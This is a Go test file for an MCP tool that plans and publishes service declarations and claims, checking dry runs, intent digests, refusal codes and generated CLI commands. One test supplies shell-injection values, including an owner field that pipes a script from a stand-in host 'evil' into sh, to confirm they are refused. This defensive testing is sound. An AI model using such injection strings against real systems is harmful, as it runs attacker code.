package mcp

import (
	"cmp"
	"context"
	"encoding/json"
	"errors"
	"go/ast"
	"go/parser"
	"go/token"
	"maps"
	"slices"
	"strconv"
	"strings"
	"testing"

	mcpsdk "github.com/modelcontextprotocol/go-sdk/mcp"

	"github.com/trianalab/pacto/v4/pkg/delivery"
)

const (
	planDigest  = "sha256:aaaa"
	otherDigest = "sha256:bbbb"
)

// stubDeclarer answers plans with a first declaration of invoices whose
// digest is planDigest, and records the calls; refuse refuses every plan,
// execRefuse every run and err fails both.
type stubDeclarer struct {
	plans, execs *[]DeclareArgs
	refuse       *Refused
	execRefuse   *Refused
	err          error
	execErr      error
	// unchanged plans a service unchanged since 1.4.0: no intent digest.
	unchanged bool
	// service is the service the plan publishes (invoices when "").
	service string
}

func (s stubDeclarer) Plan(_ context.Context, a DeclareArgs) (json.RawMessage, *Refused, error) {
	if s.plans != nil {
		*s.plans = append(*s.plans, a)
	}
	if s.err != nil {
		return nil, nil, s.err
	}
	if s.refuse != nil {
		return nil, s.refuse, nil
	}
	if s.unchanged {
		return json.RawMessage(`{"service":"invoices","unchanged":"1.4.0","intentDigest":""}`), nil, nil
	}
	return json.RawMessage(`{"service":"` + cmp.Or(s.service, "invoices") + `","version":"0.1.0","state":"draft","intentDigest":"` + planDigest +
		`","acceptCLI":"pacto declare invoices --registry ghcr.io/acme --from-draft <tag>"}`), nil, nil
}

func (s stubDeclarer) Execute(_ context.Context, a DeclareArgs) (json.RawMessage, *Refused, error) {
	if s.execs != nil {
		*s.execs = append(*s.execs, a)
	}
	if s.execErr != nil {
		return nil, nil, s.execErr
	}
	return json.RawMessage(`{"plan":{"service":"invoices","intentDigest":"` + planDigest +
		`","acceptCLI":"pacto declare invoices --registry ghcr.io/acme --from-draft draft-1"},"executed":true,"tag":"draft-1",` +
		`"published":"ghcr.io/acme/invoices@sha256:dd","draft":true}`), s.execRefuse, nil
}

// callDeclare calls pacto_declare on a stdio server with d and decodes its
// answer, error result or not.
func callDeclare(t *testing.T, d Declarer, args map[string]any) (WriteResult, *mcpsdk.CallToolResult) {
	t.Helper()
	res := callToolOn(t, mustNew("test", Authoring{Declare: d}, Modes{}), "pacto_declare", args)
	var out WriteResult
	_ = json.Unmarshal([]byte(resultText(t, res)), &out)
	return out, res
}

func TestDeclareDryRunByDefault(t *testing.T) {
	var plans, execs []DeclareArgs
	out, res := callDeclare(t, stubDeclarer{plans: &plans, execs: &execs}, map[string]any{"service": "invoices", "registry": "ghcr.io/acme",
		"accept": []string{"ledger"}, "namespace": "billing", "max_items": 5, "call_window": "2h"})
	if res.IsError || len(execs) != 0 || len(plans) != 1 || out.Executed || out.IntentDigest != planDigest ||
		out.AcceptCLI != "pacto declare invoices --registry ghcr.io/acme --from-draft <tag>" || out.Plan == nil {
		t.Fatalf("%+v %s", out, resultText(t, res))
	}
	if a := plans[0]; a.Namespace != "billing" || a.Registry != "ghcr.io/acme" || !slices.Equal(a.Accept, []string{"ledger"}) || a.MaxItems != 5 || a.CallWindow != "2h" {
		t.Fatalf("%+v", a)
	}
	if res.StructuredContent == nil {
		t.Fatal("no structured content")
	}
}

func TestDeclareExplicitDryRunPlans(t *testing.T) {
	var execs []DeclareArgs
	if out, _ := callDeclare(t, stubDeclarer{execs: &execs}, map[string]any{"service": "invoices", "dry_run": true}); len(execs) != 0 || out.Executed {
		t.Fatalf("%+v", out)
	}
}

func TestDeclareExecuteNeedsIntent(t *testing.T) {
	var execs []DeclareArgs
	out, res := callDeclare(t, stubDeclarer{execs: &execs}, map[string]any{"service": "invoices", "dry_run": false, "on_behalf_of": "ana"})
	if !res.IsError || len(execs) != 0 || out.Refusal == nil || out.Refusal.Code != RefusalIntentRequired || out.IntentDigest != planDigest ||
		out.Refusal.CLI != "pacto declare invoices --registry <registry>" {
		t.Fatalf("%+v", out)
	}
}

func TestDeclarePlanStale(t *testing.T) {
	var execs []DeclareArgs
	out, _ := callDeclare(t, stubDeclarer{execs: &execs}, map[string]any{"service": "invoices", "dry_run": false, "on_behalf_of": "ana", "intent_digest": otherDigest})
	if len(execs) != 0 || out.Refusal == nil || out.Refusal.Code != RefusalPlanStale || !strings.Contains(out.Refusal.Message, planDigest) {
		t.Fatalf("%+v", out)
	}
}

func TestDeclareExecutesDraft(t *testing.T) {
	var execs []DeclareArgs
	out, res := callDeclare(t, stubDeclarer{execs: &execs}, map[string]any{"service": "invoices", "dry_run": false, "on_behalf_of": "ana", "intent_digest": planDigest})
	if res.IsError || len(execs) != 1 || execs[0].OnBehalfOf != "ana" || !out.Executed || out.Draft == nil || out.Draft.Tag != "draft-1" ||
		out.Draft.Published != "ghcr.io/acme/invoices@sha256:dd" || out.Draft.Signed || out.AcceptCLI != "pacto declare invoices --registry ghcr.io/acme --from-draft draft-1" {
		t.Fatalf("%+v %s", out, resultText(t, res))
	}
	// A refused run keeps its code and its own command.
	out, res = callDeclare(t, stubDeclarer{execRefuse: &Refused{Code: RefusalVersionConflict, Message: "taken", CLI: "pacto declare x"}},
		map[string]any{"service": "invoices", "dry_run": false, "on_behalf_of": "ana", "intent_digest": planDigest})
	if !res.IsError || out.Refusal.Code != RefusalVersionConflict || out.Refusal.CLI != "pacto declare x" {
		t.Fatalf("%+v", out)
	}
}

func TestMCPDeclareNeedsOnBehalfOf(t *testing.T) {
	var plans []DeclareArgs
	_, res := callDeclare(t, stubDeclarer{plans: &plans}, map[string]any{"service": "invoices", "dry_run": false, "intent_digest": planDigest})
	if !res.IsError || len(plans) != 0 || !strings.Contains(resultText(t, res), "on_behalf_of is required") {
		t.Fatalf("%s", resultText(t, res))
	}
}

func TestDeclareErrors(t *testing.T) {
	_, res := callDeclare(t, stubDeclarer{err: errors.New("boom")}, map[string]any{"service": "invoices"})
	if !res.IsError || resultText(t, res) != "boom" {
		t.Fatalf("%s", resultText(t, res))
	}
	_, res = callDeclare(t, stubDeclarer{execErr: errors.New("push failed")},
		map[string]any{"service": "invoices", "dry_run": false, "on_behalf_of": "ana", "intent_digest": planDigest})
	if !res.IsError || resultText(t, res) != "push failed" {
		t.Fatalf("%s", resultText(t, res))
	}
}

func TestDeclareRefusalCarriesCodeAndCLI(t *testing.T) {
	args := map[string]any{"service": "billing/invoices", "namespace": "billing", "dir": "drafts/invoices", "registry": "ghcr.io/acme", "accept": []string{"ledger", "audit"}}
	for _, code := range writeRefusals {
		out, res := callDeclare(t, stubDeclarer{refuse: &Refused{Code: code, Message: "refused"}}, args)
		if !res.IsError || out.Refusal == nil || out.Refusal.Code != code ||
			out.Refusal.CLI != "pacto declare billing/invoices --namespace billing --dir drafts/invoices --registry ghcr.io/acme --accept ledger --accept audit" {
			t.Errorf("%s: %+v", code, out)
		}
	}
	tools := listTools(t, mustNew("test", Authoring{Declare: stubDeclarer{}}, Modes{}))
	schema, _ := json.Marshal(tools["pacto_declare"].OutputSchema)
	for _, code := range writeRefusals {
		if !strings.Contains(string(schema), `"`+string(code)+`"`) {
			t.Errorf("the output schema does not list %s", code)
		}
	}
	if got := (DeclareArgs{Service: "invoices", Registry: "r"}).Command(planDigest); got != "pacto declare invoices --registry r --intent "+planDigest {
		t.Fatal(got)
	}
	// The read bounds change the plan, so the command replays them.
	if got := (DeclareArgs{Service: "invoices", Registry: "r", MaxItems: 50, CallWindow: "1h"}).Command(""); got != "pacto declare invoices --registry r --max-items 50 --call-window 1h" {
		t.Fatal(got)
	}
}

// An unchanged plan writes nothing and refuses nothing, whatever dry_run says.
func TestDeclareUnchangedIsNoRefusal(t *testing.T) {
	for _, dry := range []bool{true, false} {
		var execs []DeclareArgs
		out, res := callDeclare(t, stubDeclarer{execs: &execs, unchanged: true}, map[string]any{"service": "invoices", "dry_run": dry, "on_behalf_of": "ana", "intent_digest": otherDigest})
		if res.IsError || out.Refusal != nil || out.Executed || len(execs) != 0 || out.Plan == nil {
			t.Errorf("dry_run %v: %+v", dry, out)
		}
	}
}

// TestRefusalEnumMatchesApp: every declare refusal code internal/app
// defines is in the enum, and the enum holds nothing else but this
// contract's own codes.
func TestRefusalEnumMatchesApp(t *testing.T) {
	f, err := parser.ParseFile(token.NewFileSet(), "../app/declare.go", nil, 0)
	if err != nil {
		t.Fatal(err)
	}
	var app []string
	ast.Inspect(f, func(n ast.Node) bool {
		if v, ok := n.(*ast.ValueSpec); ok && strings.HasPrefix(v.Names[0].Name, "code") && len(v.Values) == 1 {
			if lit, ok := v.Values[0].(*ast.BasicLit); ok {
				s, _ := strconv.Unquote(lit.Value)
				app = append(app, s)
			}
		}
		return true
	})
	want := append(append(app, string(RefusalIntentRequired), string(RefusalExecuteNeedsStdio), string(RefusalNotAllowed), string(RefusalReviewFailed)),
		delivery.OwnerRightCodes...)
	got := make([]string, len(writeRefusals))
	for i, c := range writeRefusals {
		got[i] = string(c)
	}
	slices.Sort(want)
	slices.Sort(got)
	if len(app) < 10 || !slices.Equal(got, want) {
		t.Fatalf("enum %v\napp + own %v", got, want)
	}
}

// TestDeclareToolRefusalCodesEnum: pacto_declare's output schema lists the
// owner rule's four codes, spelled as pkg/delivery defines them.
func TestDeclareToolRefusalCodesEnum(t *testing.T) {
	tools := listTools(t, mustNew("test", Authoring{Declare: stubDeclarer{}}, Modes{}))
	raw, _ := json.Marshal(tools["pacto_declare"].OutputSchema)
	var schema struct {
		Properties struct {
			Refusal struct {
				Properties struct {
					Code struct {
						Enum []string `json:"enum"`
					} `json:"code"`
				} `json:"properties"`
			} `json:"refusal"`
		} `json:"properties"`
	}
	_ = json.Unmarshal(raw, &schema)
	enum := schema.Properties.Refusal.Properties.Code.Enum
	if len(enum) < 4 {
		t.Fatalf("%s", raw)
	}
	if got := enum[len(enum)-4:]; !slices.Equal(got, delivery.OwnerRightCodes) {
		t.Fatalf("%v", enum)
	}
}

func TestDeclareNamedOnlyWhenRegistered(t *testing.T) {
	for _, a := range []Authoring{{}, {Remote: true}} {
		if strings.Contains(baseFor(a), "pacto_declare") || slices.Contains(authoringNames(a), "pacto_declare") {
			t.Errorf("%+v names pacto_declare", a)
		}
		if listTools(t, mustNew("test", a, Modes{}))["pacto_declare"] != nil {
			t.Errorf("%+v registers pacto_declare", a)
		}
		a.Declare = stubDeclarer{}
		if !strings.Contains(baseFor(a), "pacto_declare") || !slices.Contains(authoringNames(a), "pacto_declare") {
			t.Errorf("%+v does not name pacto_declare", a)
		}
	}
	remote := listTools(t, mustNew("test", Authoring{Remote: true, Declare: stubDeclarer{}}, Modes{}))
	if !strings.Contains(remote["pacto_declare"].InputSchema.(map[string]any)["properties"].(map[string]any)["dir"].(map[string]any)["description"].(string), "Refused over HTTP") {
		t.Errorf("%+v", remote["pacto_declare"].InputSchema)
	}
}

func TestMCPDeclareDraftArgument(t *testing.T) {
	var plans, execs []DeclareArgs
	out, res := callDeclare(t, stubDeclarer{plans: &plans, execs: &execs}, map[string]any{"service": "invoices", "draft": true,
		"dry_run": false, "on_behalf_of": "ana", "intent_digest": planDigest})
	if res.IsError || len(plans) != 1 || !plans[0].Draft || len(execs) != 1 || !execs[0].Draft || out.Draft == nil {
		t.Fatalf("%+v %+v %s", plans, execs, resultText(t, res))
	}
	stdio := listTools(t, mustNew("test", Authoring{Declare: stubDeclarer{}}, Modes{}))
	if !strings.Contains(stdio["pacto_declare"].InputSchema.(map[string]any)["properties"].(map[string]any)["draft"].(map[string]any)["description"].(string), "without a person's login") {
		t.Errorf("%+v", stdio["pacto_declare"].InputSchema)
	}
}

// TestMCPDeclareHTTPDraftArgumentNeedsRegistry: over HTTP draft is refused
// unless the server has a registry, and on_behalf_of is the reviewed caller.
func TestMCPDeclareHTTPDraftArgumentNeedsRegistry(t *testing.T) {
	remote := listTools(t, mustNew("test", Authoring{Remote: true, Declare: stubDeclarer{}}, Modes{}))
	props := remote["pacto_declare"].InputSchema.(map[string]any)["properties"].(map[string]any)
	if !strings.Contains(props["draft"].(map[string]any)["description"].(string), "refused when the server has no registry") ||
		!strings.Contains(props["on_behalf_of"].(map[string]any)["description"].(string), "the caller this server reviewed") {
		t.Errorf("%+v", props)
	}
	if desc := remote["pacto_declare"].Description; !strings.Contains(desc, "over HTTP it writes that draft only when the server has a registry") {
		t.Error(desc)
	}
}

// TestMCPDeclareHTTPWritesWithoutOnBehalfOf: over HTTP the server names who
// a draft is for, so a write needs no on_behalf_of; a run that answers no
// plan carries its own accept command.
func TestMCPDeclareHTTPWritesWithoutOnBehalfOf(t *testing.T) {
	var execs []DeclareArgs
	d := planOnlyRun{stubDeclarer{execs: &execs}}
	res := callToolOn(t, mustNew("test", Authoring{Remote: true, Declare: d}, Modes{}), "pacto_declare",
		map[string]any{"service": "invoices", "dry_run": false, "intent_digest": planDigest})
	var out WriteResult
	_ = json.Unmarshal([]byte(resultText(t, res)), &out)
	if res.IsError || len(execs) != 1 || out.Draft == nil || out.Plan == nil || out.AcceptCLI != "pacto declare invoices --registry r --from-draft draft-2" {
		t.Fatalf("%+v %s", out, resultText(t, res))
	}
}

// planOnlyRun is a stubDeclarer whose run answers no plan.
type planOnlyRun struct{ stubDeclarer }

func (p planOnlyRun) Execute(ctx context.Context, a DeclareArgs) (json.RawMessage, *Refused, error) {
	_, _, _ = p.stubDeclarer.Execute(ctx, a)
	return json.RawMessage(`{"executed":true,"tag":"draft-2","draft":true,"acceptCLI":"pacto declare invoices --registry r --from-draft draft-2"}`), nil, nil
}

func TestDeclareArgsCommandClaim(t *testing.T) {
	a := DeclareArgs{Service: "external:aws/rds/eu-west-1/orders-db", Owner: "team-platform", Registry: "ghcr.io/acme"}
	if got := a.Command(planDigest); got != "pacto claim aws/rds/eu-west-1/orders-db --owner team-platform --registry ghcr.io/acme --intent "+planDigest {
		t.Fatal(got)
	}
	if got := (DeclareArgs{Service: "external:stripe"}).Command(""); got != "pacto claim stripe --owner <team> --registry <registry>" {
		t.Fatal(got)
	}
	if a.Verb() != "pacto claim" || (DeclareArgs{Service: "invoices"}).Verb() != "pacto declare" {
		t.Fatal("verb")
	}
}

func TestDeclareArgsCommandClaimName(t *testing.T) {
	a := DeclareArgs{Service: "external:stripe", Owner: "team-platform", Name: "payments-stripe", Registry: "ghcr.io/acme"}
	if got := a.Command(""); got != "pacto claim stripe --owner team-platform --name payments-stripe --registry ghcr.io/acme" {
		t.Fatal(got)
	}
}

// TestDeclareArgsRefusalCLIClaim: a refusal that names no command names the
// pacto claim a person runs, with every claim argument.
func TestDeclareArgsRefusalCLIClaim(t *testing.T) {
	var plans []DeclareArgs
	out, res := callDeclare(t, stubDeclarer{plans: &plans}, map[string]any{"service": "external:stripe", "owner": "team-platform", "name": "payments-stripe",
		"registry": "ghcr.io/acme", "dry_run": false, "on_behalf_of": "ana"})
	if !res.IsError || out.Refusal == nil || out.Refusal.Code != RefusalIntentRequired ||
		out.Refusal.CLI != "pacto claim stripe --owner team-platform --name payments-stripe --registry ghcr.io/acme" {
		t.Fatalf("%+v", out)
	}
	if a := plans[0]; a.Owner != "team-platform" || a.Name != "payments-stripe" {
		t.Fatalf("%+v", a)
	}
}

func TestDeclareToolNamesClaim(t *testing.T) {
	tool := listTools(t, mustNew("test", Authoring{Declare: stubDeclarer{}}, Modes{}))["pacto_declare"]
	schema, _ := json.Marshal(tool.InputSchema)
	if !strings.Contains(tool.Description, "pacto claim <identity> --from-draft draft-<n> --yes") || !strings.Contains(string(schema), `"owner"`) ||
		!strings.Contains(string(schema), `"name"`) {
		t.Fatalf("%s\n%s", tool.Description, schema)
	}
}

// TestDeclareToolRefusesBadClaimName: the schema refuses a name that is no
// service name before the planner runs.
func TestDeclareToolRefusesBadClaimName(t *testing.T) {
	for _, name := range []string{"Bad/Name", "-x", strings.Repeat("a", 64)} {
		var plans []DeclareArgs
		res := callToolOn(t, mustNew("test", Authoring{Declare: stubDeclarer{plans: &plans}}, Modes{}), "pacto_declare",
			map[string]any{"service": "external:stripe", "owner": "team-platform", "name": name, "registry": "ghcr.io/acme"})
		if !res.IsError || len(plans) != 0 {
			t.Fatalf("%q: %s", name, resultText(t, res))
		}
	}
	var plans []DeclareArgs
	res := callToolOn(t, mustNew("test", Authoring{Declare: stubDeclarer{plans: &plans}}, Modes{}), "pacto_declare",
		map[string]any{"service": "external:stripe", "owner": "team-platform", "name": strings.Repeat("a", 63), "registry": "ghcr.io/acme"})
	if res.IsError || len(plans) != 1 {
		t.Fatal(resultText(t, res))
	}
}

// TestDeclareRefusalCLIClaimsPlannedName: a claim with no name that the
// Declarer planned under another name (a visible claim's) is refused with a
// pacto claim of that name, never of the default repository.
func TestDeclareRefusalCLIClaimsPlannedName(t *testing.T) {
	out, res := callDeclare(t, stubDeclarer{service: "payments-stripe"}, map[string]any{"service": "external:stripe", "owner": "team-b",
		"registry": "ghcr.io/acme", "dry_run": false, "on_behalf_of": "ana"})
	if !res.IsError || out.Refusal == nil || out.Refusal.Code != RefusalIntentRequired ||
		out.Refusal.CLI != "pacto claim stripe --owner team-b --name payments-stripe --registry ghcr.io/acme" {
		t.Fatalf("%+v", out)
	}
	// The default name adds nothing.
	out, _ = callDeclare(t, stubDeclarer{service: "stripe"}, map[string]any{"service": "external:stripe", "owner": "team-b",
		"registry": "ghcr.io/acme", "dry_run": false, "on_behalf_of": "ana"})
	if out.Refusal == nil || out.Refusal.CLI != "pacto claim stripe --owner team-b --registry ghcr.io/acme" {
		t.Fatalf("%+v", out)
	}
}

// TestDeclareRefusesArgsTheSubjectTakesNot: a claim takes no workload
// argument and a workload no owner or name, refused before any plan with a
// command pacto claim (or pacto declare) accepts.
func TestDeclareRefusesArgsTheSubjectTakesNot(t *testing.T) {
	claim := map[string]any{"service": "external:stripe", "owner": "team-a", "registry": "ghcr.io/acme"}
	with := func(base map[string]any, k string, v any) map[string]any {
		m := maps.Clone(base)
		m[k] = v
		return m
	}
	for name, args := range map[string]map[string]any{
		"max_items": with(claim, "max_items", 500), "namespace": with(claim, "namespace", "shop"), "dir": with(claim, "dir", "./x"),
		"accept": with(claim, "accept", []string{"ledger"}), "call_window": with(claim, "call_window", "2h"),
	} {
		var plans []DeclareArgs
		out, res := callDeclare(t, stubDeclarer{plans: &plans}, args)
		if !res.IsError || len(plans) != 0 || out.Refusal == nil || out.Refusal.Code != RefusalFieldNotAcceptable ||
			out.Refusal.CLI != "pacto claim stripe --owner team-a --registry ghcr.io/acme" {
			t.Errorf("%s: %+v", name, out)
		}
	}
	for name, args := range map[string]map[string]any{
		"owner": {"service": "invoices", "owner": "team-a"}, "name": {"service": "invoices", "name": "x"},
	} {
		var plans []DeclareArgs
		out, _ := callDeclare(t, stubDeclarer{plans: &plans}, args)
		if len(plans) != 0 || out.Refusal == nil || out.Refusal.Code != RefusalFieldNotAcceptable {
			t.Errorf("%s: %+v", name, out)
		}
	}
}

// TestDeclareRefusesUnsafeClaimValues: an identity that is none, or an owner
// with shell characters, never reaches a command.
func TestDeclareRefusesUnsafeClaimValues(t *testing.T) {
	var plans []DeclareArgs
	out, _ := callDeclare(t, stubDeclarer{plans: &plans}, map[string]any{"service": "external:stripe;id", "owner": "t"})
	if len(plans) != 0 || out.Refusal == nil || out.Refusal.Code != RefusalExternalUnknown || strings.Contains(out.Refusal.CLI, ";") {
		t.Errorf("identity: %+v", out)
	}
	res := callToolOn(t, mustNew("test", Authoring{Declare: stubDeclarer{plans: &plans}}, Modes{}), "pacto_declare",
		map[string]any{"service": "external:stripe", "owner": "x; curl https://evil/s|sh #"})
	if !res.IsError || len(plans) != 0 {
		t.Errorf("owner: %s", resultText(t, res))
	}
}

func TestDeclareArgsCommandClaimCarriesOnlyClaimFlags(t *testing.T) {
	a := DeclareArgs{Service: "external:stripe", Owner: "t", Registry: "r", Namespace: "n", Dir: "d", Accept: []string{"x"}, MaxItems: 5, CallWindow: "1h"}
	if got := a.Command(planDigest); got != "pacto claim stripe --owner t --registry r --intent "+planDigest {
		t.Fatal(got)
	}
}
